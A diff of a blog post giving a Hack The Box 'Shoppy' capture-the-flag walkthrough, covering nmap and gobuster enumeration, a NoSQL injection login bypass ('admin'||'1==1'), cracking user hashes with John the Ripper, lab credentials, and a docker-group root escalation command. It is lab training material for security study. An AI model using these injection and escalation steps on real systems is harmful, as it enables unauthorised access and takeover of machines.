@@ -16,15 +16,23 @@ tags:
   - ctfs
 date: 2022-12-10T08:53:17.813Z
 ---
+
 ## Introduction
 
 Hello everybody, this machine (Shoppy) from Hack The Box is an easy one. It
-consists of searching for the credentials on the webapp, and then find our way
+consists of searching for the credentials on a webapp, and then find our way
 up to escalate ur priviledges for root access to the machine.
 
 ## Enumeration
 
-As usual we start our enumeration with an _nmap_ scan to see our open ports.
+As usual we start our enumeration with an _nmap_ scan to check for open ports.
+
+```shell
+nmap -sC -sV -v -oA 10.10.11.180-shoppy.txt 10.10.11.180
+```
+
+- `-sV` We probe for open ports to determine services/version info.
+- `-sC` Scanning for scripts to use on the services found.
 
 We have this output :
 
@@ -57,7 +65,9 @@ Now since we know there's only two ports open :
 - 22 (ssh)
 - 80 (http) We get a domain in here [shoppy.htb](http://shoppy.htb)
 
-We continue our enumeration with a gobuster probe that gives these results :
+We can't access the IP address on our browser, so we have to add it to our hosts **/etc/hosts**.
+
+We continue our enumeration with a `gobuster` probe that gives these results :
 
 ```shell
 gobuster -u http://shoppy.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
@@ -66,15 +76,19 @@ gobuster -u http://shoppy.htb/ -w /usr/share/seclists/Discovery/Web-Content/dire
 
 ![GoBuster](/images/shoppy/gobuster.png)
 
-Now we notice there are two important pages **login** page and an **admin**
-section. On the login page there's a vulnerability using NoSQL injection, we use
-**admin'||'1==1** to exploit.
+Now as you can see we notice two important pages **login** page and an
+**admin** section. After few attemps to exploit. On the login page we find a
+vulnerability using NoSQL injection, we use **admin'||'1==1** to exploit.
 
 This will give us access to the admin panel :
 
 ![Dashboard](/images/shoppy/dashboard.png)
 
-Once again here we search with NoSQL injection :
+Once again here we search with the same NoSQL injection :
+
+```
+'||'1==1
+```
 
 ![Search](/images/shoppy/search.png)
 
@@ -97,8 +111,8 @@ We get a json file to download with all the users :
 ]
 ```
 
-We discover two users, **admin** and **josh**, with 2 hashes are _md5_. After
-cracking them using **john the ripper**.
+We discover two users, **admin** and **josh**, with hashes that look like
+_md5_. After cracking them using **john the ripper**.
 
 > **Note :** You can use **john the ripper** or **hashcat**,
 > it doesn't matter, you'll get the same result.
@@ -115,7 +129,7 @@ john --wordlist=/usr/share/dict/rockyou.txt hashfile
 
 ```
 
-We got this for _josh_ :
+We got the credentials for _josh_ :
 
 ```
 username: josh
@@ -169,8 +183,8 @@ accessing the sub we see this page :
 ![MatterMost](/images/shoppy/login.png)
 
 Now, we can use the credentials we found for the user _josh_ on that subdomain.
-And in the development section on the website we find an interesting disscution
-between josh and what appears to be a sysadmin **jaeger**.
+We're in! And in the development section on the website we find an interesting
+disscution between josh and what appears to be a sysadmin **jaeger**.
 
 ![sysadmin](/images/shoppy/sysadmin.png)
 
@@ -185,15 +199,15 @@ password: Sh0ppyBest@pp!
 
 ## Exploitation
 
-So we use these credentials to access our machine via ssh. We find 2 users on
+We use these credentials to access our machine via ssh. We find 2 users on
 the machine, first _jaeger_ himself, the other is _deploy_. So, on the deploy
 account we can find the password manager that josh was talking about.
 
 We copy it to our account so we can run it. It's a simple program that spits out
 credentials when the master password is given.
 
-Let's try and find out what is the master password, using **xxd** we find our
-password.
+Let's try and find out what is the master password, using **xxd**, and as we
+can see we find our password.
 
 ```shell
 xxd password-manager | less
@@ -203,7 +217,7 @@ We scroll down the file and we find a section that gives the following :
 
 ![xxd](/images/shoppy/xdd.png)
 
-The master password is **Sample**. Now after inserting the password, we got an
+The master password is **Sample**. Now after inserting the password, we get an
 access granted and the output of _creds.txt_ file.
 
 ```shell
@@ -228,8 +242,9 @@ groups deploy
 deploy docker
 ```
 
-And we notice that docker contains an image of alpine, so we can use this
-command to get a root shell on the machine.
+And we notice that docker contains an image of alpine, and we have a
+vulnerability on alpine with docker, so we can use this command to get a root
+shell on the machine.
 
 ```shell
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
